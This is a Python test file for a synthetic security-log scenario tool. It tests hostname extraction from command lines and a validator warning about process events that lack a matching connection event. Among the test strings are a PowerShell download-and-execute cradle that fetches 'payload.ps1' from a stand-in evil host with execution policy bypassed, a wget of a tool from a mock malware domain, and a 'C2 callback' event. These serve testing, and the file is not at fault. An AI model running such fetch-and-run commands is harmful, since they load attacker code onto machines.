# Copyright (c) 2026 Cisco Systems, Inc. and its affiliates
# SPDX-License-Identifier: MIT

"""Tests for Theme 2: storyline network correlation (P0-2).

Covers:
- ConnectionEventSpec.hostname field
- Storyline handler using spec.hostname for DNS/SSL
- Validation warning for process commands with URLs missing sibling connections
- URL hostname extraction utility
"""

from datetime import datetime

from evidenceforge.models import (
    BaselineActivity,
    Environment,
    OutputSpec,
    Scenario,
    StorylineEvent,
    System,
    TimeWindow,
    User,
)
from evidenceforge.models.scenario import ConnectionEventSpec
from evidenceforge.validation import ScenarioValidator
from evidenceforge.validation.url_extractor import extract_hostnames_from_command

# ---------------------------------------------------------------------------
# URL extractor tests
# ---------------------------------------------------------------------------


class TestUrlExtractor:
    """Tests for extract_hostnames_from_command()."""

    def test_invoke_webrequest(self):
        cmd = "powershell.exe -Command \"Invoke-WebRequest -Uri 'https://cdn-assets-update.com/update.zip'\""
        assert extract_hostnames_from_command(cmd) == {"cdn-assets-update.com"}

    def test_downloadstring(self):
        cmd = "powershell.exe -ep bypass -c \"IEX (New-Object Net.WebClient).DownloadString('http://evil.example.org/payload.ps1')\""
        assert extract_hostnames_from_command(cmd) == {"evil.example.org"}

    def test_curl(self):
        cmd = "curl -s https://api.example.com/status"
        assert extract_hostnames_from_command(cmd) == {"api.example.com"}

    def test_wget(self):
        cmd = "wget https://download.malware-domain.net/tool.tar.gz -O /tmp/tool.tar.gz"
        assert extract_hostnames_from_command(cmd) == {"download.malware-domain.net"}

    def test_raw_ip_ignored(self):
        """Raw IP addresses in URLs should not be extracted as hostnames."""
        cmd = "Invoke-WebRequest -Uri 'https://159.65.43.201/payload'"
        assert extract_hostnames_from_command(cmd) == set()

    def test_no_urls(self):
        cmd = "cmd.exe /c whoami"
        assert extract_hostnames_from_command(cmd) == set()

    def test_multiple_urls(self):
        cmd = "curl https://first.example.com/a && wget http://second.example.org/b"
        result = extract_hostnames_from_command(cmd)
        assert result == {"first.example.com", "second.example.org"}

    def test_bare_process_name(self):
        cmd = "notepad.exe"
        assert extract_hostnames_from_command(cmd) == set()


# ---------------------------------------------------------------------------
# ConnectionEventSpec.hostname field tests
# ---------------------------------------------------------------------------


class TestConnectionEventSpecHostname:
    """Tests for the hostname field on ConnectionEventSpec."""

    def test_hostname_accepted(self):
        spec = ConnectionEventSpec(
            dst_ip="159.65.43.201",
            dst_port=443,
            hostname="cdn-assets-update.com",
        )
        assert spec.hostname == "cdn-assets-update.com"

    def test_hostname_defaults_none(self):
        spec = ConnectionEventSpec(dst_ip="159.65.43.201")
        assert spec.hostname is None

    def test_hostname_in_storyline_event(self):
        """hostname field works when embedded in a storyline event dict."""
        scenario = Scenario(
            version="1.0",
            name="test",
            description="Test scenario",
            environment=Environment(
                description="Test env",
                users=[User(username="testuser", full_name="Test User", email="t@e.com")],
                systems=[
                    System(hostname="DC-01", ip="10.0.0.1", os="Windows Server 2019", type="server")
                ],
            ),
            time_window=TimeWindow(start=datetime(2024, 1, 15, 10, 0, 0), duration="1h"),
            baseline_activity=BaselineActivity(
                description="Test", intensity="medium", variation="low"
            ),
            storyline=[
                StorylineEvent(
                    id="evt-net-001",
                    time="2024-01-15T10:30:00Z",
                    actor="testuser",
                    system="DC-01",
                    activity="C2 callback",
                    events=[
                        {
                            "type": "connection",
                            "dst_ip": "159.65.43.201",
                            "dst_port": 443,
                            "hostname": "cdn-assets-update.com",
                        }
                    ],
                )
            ],
            output=OutputSpec(logs=[{"format": "zeek"}], destination="./output", compression=False),
        )
        # Scenario parses without error
        assert scenario.storyline[0].events[0].hostname == "cdn-assets-update.com"


# ---------------------------------------------------------------------------
# Validation warning tests
# ---------------------------------------------------------------------------


class TestProcessNetworkPairingValidation:
    """Tests for _validate_process_network_pairing() warning."""

    def _make_scenario(self, events_list):
        """Helper to build a minimal scenario with one storyline entry."""
        return Scenario(
            version="1.0",
            name="test",
            description="Test scenario",
            environment=Environment(
                description="Test env",
                users=[User(username="testuser", full_name="Test User", email="t@e.com")],
                systems=[
                    System(hostname="DC-01", ip="10.0.0.1", os="Windows Server 2019", type="server")
                ],
            ),
            time_window=TimeWindow(start=datetime(2024, 1, 15, 10, 0, 0), duration="1h"),
            baseline_activity=BaselineActivity(
                description="Test", intensity="medium", variation="low"
            ),
            storyline=[
                StorylineEvent(
                    id="evt-net-001",
                    time="2024-01-15T10:30:00Z",
                    actor="testuser",
                    system="DC-01",
                    activity="test activity",
                    events=events_list,
                )
            ],
            output=OutputSpec(
                logs=[{"format": "windows"}], destination="./output", compression=False
            ),
        )

    def test_warns_on_process_url_without_connection(self):
        """Process with URL but no sibling connection should warn."""
        scenario = self._make_scenario(
            [
                {
                    "type": "process",
                    "process_name": "powershell.exe",
                    "command_line": "powershell.exe Invoke-WebRequest -Uri 'https://cdn-assets-update.com/update.zip'",
                }
            ]
        )
        validator = ScenarioValidator(scenario)
        issues = validator.validate()

        pairing_warnings = [
            i for i in issues if "cdn-assets-update.com" in i.message and i.severity == "warning"
        ]
        assert len(pairing_warnings) == 1
        assert "connection event" in pairing_warnings[0].suggestion.lower()

    def test_no_warning_when_connection_has_hostname(self):
        """Process+connection pair with matching hostname should not warn."""
        scenario = self._make_scenario(
            [
                {
                    "type": "process",
                    "process_name": "powershell.exe",
                    "command_line": "powershell.exe Invoke-WebRequest -Uri 'https://cdn-assets-update.com/update.zip'",
                },
                {
                    "type": "connection",
                    "dst_ip": "159.65.43.201",
                    "dst_port": 443,
                    "hostname": "cdn-assets-update.com",
                },
            ]
        )
        validator = ScenarioValidator(scenario)
        issues = validator.validate()

        pairing_warnings = [
            i for i in issues if "cdn-assets-update.com" in i.message and i.severity == "warning"
        ]
        assert len(pairing_warnings) == 0

    def test_no_warning_for_raw_ip_url(self):
        """Process with raw-IP URL should not warn (no domain to pair)."""
        scenario = self._make_scenario(
            [
                {
                    "type": "process",
                    "process_name": "powershell.exe",
                    "command_line": "powershell.exe Invoke-WebRequest -Uri 'https://159.65.43.201/payload'",
                }
            ]
        )
        validator = ScenarioValidator(scenario)
        issues = validator.validate()

        pairing_warnings = [
            i
            for i in issues
            if "process command references" in i.message and i.severity == "warning"
        ]
        assert len(pairing_warnings) == 0

    def test_no_warning_for_process_without_url(self):
        """Process without URL in command line should not warn."""
        scenario = self._make_scenario(
            [
                {
                    "type": "process",
                    "process_name": "cmd.exe",
                    "command_line": "cmd.exe /c whoami",
                }
            ]
        )
        validator = ScenarioValidator(scenario)
        issues = validator.validate()

        pairing_warnings = [
            i
            for i in issues
            if "process command references" in i.message and i.severity == "warning"
        ]
        assert len(pairing_warnings) == 0
